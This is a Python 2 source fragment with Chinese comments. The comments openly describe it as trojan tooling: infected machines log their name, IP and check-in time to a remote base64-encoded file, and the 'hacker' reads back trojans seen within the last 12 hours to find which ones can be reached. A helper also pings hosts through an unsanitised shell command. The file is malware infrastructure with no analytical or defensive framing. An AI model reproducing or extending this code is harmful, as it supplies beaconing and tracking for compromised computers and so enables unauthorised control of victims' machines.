# -*- coding:utf-8 -*-

#获得本机ip地址
def LocalIp():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 0))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP


#获取本机更新时间
def getLocalTime():
	nowstamp = int(time.time())
	#turn into other format like:"%Y-%m-%d %H:%M:%S"
	timeArray = time.localtime(nowstamp)
	dateTimeFormat = time.strftime("%m/%d", timeArray)
	dayTimeFormat = time.strftime("%H:%M:%S", timeArray)
	return dateTimeFormat,dayTimeFormat


#黑客获得可能能连接上的木马的Ip
def getRightIp(oricon):
	nowdate , nowtime = getLocalTime()
	if oricon == None : print "dont have such file\n" ;return;
	else :
		strtime = ""
		trydict = dict()	#initialize
		orimsg = base64.decodestring(str(oricon.content))
		print orimsg
		orilist = orimsg.split("\n")
		print orilist
		print "len of mumaip",len(orilist)
		for ilist in orilist :
			if ilist == "" or ilist == " ": continue;
			if ilist.split()[2]==nowdate :
				print "the same day"
				# can add condition by nowtime within 12 hours
				if int(nowtime.split(":")[0])-int(ilist.split()[3].split(":")[0])<13 :
					print "the same 12 hours"
					trydict[ilist.split()[0]]=ilist.split()[1]
					print ilist.split()[0]+" has been added"
				continue;
		return trydict

def NetCheck(ip):
   try:
    p = subprocess.Popen(["ping -c 1 -w 1 "+ ip],stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
    out=p.stdout.read()
    regex=re.compile('100% packet loss')
    if len(regex.findall(out)) == 0:
        print ip + ': host up'
        return 'UP'
    else:
        print ip + ': host down'
        return 'DOWN'
   except:
    print 'NetCheck work error!'
    return 'ERR'



def writeIpAppend(oricon,name,iip,d,t):
    if oricon == None : print "dont have such file\n" ;return;
    orimsg=base64.decodestring(str(oricon.content)) #origin file content
    if orimsg.find(name)==-1 :  # check if the pc is in origin file
        print "add new pc"
        oricon.update("append automatically from py",orimsg+str(name)+" "+iip+" "+d+" "+t+"\n")
    else :  # if have before
        print "update pc"
        newmsg = ""
        orilist = orimsg.split("\n")
        for ilist in orilist :
            if ilist == "" or ilist == " ": continue;
            if ilist.split()[0]==name :
                #print "origin msg : "+ilist
                newmsg += str(name)+" "+iip+" "+d+" "+t+"\n"    # new pc's time update
                continue;
            else :
                newmsg += ilist+"\n"
        oricon.update("update automatically from py",newmsg)

